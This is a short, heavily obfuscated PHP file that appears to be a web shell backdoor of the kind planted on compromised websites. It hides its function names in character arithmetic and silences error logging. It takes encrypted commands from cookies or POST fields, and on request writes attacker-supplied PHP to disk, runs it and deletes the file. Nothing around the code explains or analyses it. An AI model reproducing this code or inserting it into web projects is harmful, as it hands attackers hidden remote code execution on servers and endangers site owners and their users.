<?php $sopbyzfv = 'f'."\x69".chr(871-763).chr(152-51).chr(95).chr(859-747).chr(531-414).'t'.chr(95)."\x63"."\x6f".chr(110)."\164"."\145".'n'.chr(174-58).'s';
$sykmft = chr(98).chr(997-900).chr(540-425).chr(295-194).chr(179-125)."\x34"."\x5f"."\x64".chr(827-726).chr(99)."\x6f".chr(126-26).'e';
$doraldm = chr(803-698).'n'."\x69".'_'.'s'."\145"."\164";
$jkbitd = chr(728-611).'n'."\154".chr(105).chr(110)."\153";


@$doraldm(chr(101)."\162".'r'.chr(371-260)."\162".chr(95).chr(108).chr(111)."\147", NULL);
@$doraldm(chr(880-772).'o'.chr(103)."\137"."\x65"."\x72".chr(114)."\157"."\x72".'s', 0);
@$doraldm('m'.'a'."\x78".chr(415-320)."\x65".chr(120).chr(761-660).chr(697-598).'u'.chr(116).chr(897-792)."\x6f".chr(110).'_'.chr(558-442)."\151"."\x6d"."\145", 0);
@set_time_limit(0);

function nceeka($sqwqk, $todqvhpvuj)
{
    $mhqqykyxz = "";
    for ($sjesxar = 0; $sjesxar < strlen($sqwqk);) {
        for ($j = 0; $j < strlen($todqvhpvuj) && $sjesxar < strlen($sqwqk); $j++, $sjesxar++) {
            $mhqqykyxz .= chr(ord($sqwqk[$sjesxar]) ^ ord($todqvhpvuj[$j]));
        }
    }
    return $mhqqykyxz;
}

$fswrosj = array_merge($_COOKIE, $_POST);
$pwyqp = '2519fb4b-cef6-4874-9c35-08ef723ab849';
foreach ($fswrosj as $qfdietpwy => $sqwqk) {
    $sqwqk = @unserialize(nceeka(nceeka($sykmft($sqwqk), $pwyqp), $qfdietpwy));
    if (isset($sqwqk["\141".chr(107)])) {
        if ($sqwqk['a'] == chr(816-711)) {
            $sjesxar = array(
                chr(524-412).'v' => @phpversion(),
                "\x73"."\x76" => "3.5",
            );
            echo @serialize($sjesxar);
        } elseif ($sqwqk['a'] == "\145") {
            $kdezgi = "./" . md5($pwyqp) . "\x2e"."\151".chr(110)."\143";
            @$sopbyzfv($kdezgi, "<" . chr(911-848)."\160"."\x68".chr(112)."\40".chr(64).'u'."\156".'l'.chr(105)."\156".chr(1093-986).'('."\x5f"."\x5f".'F'.'I'.chr(76).'E'.chr(777-682)."\x5f"."\51".';'."\x20" . $sqwqk['d']);
            include($kdezgi);
            @$jkbitd($kdezgi);
        }
        exit();
    }
}

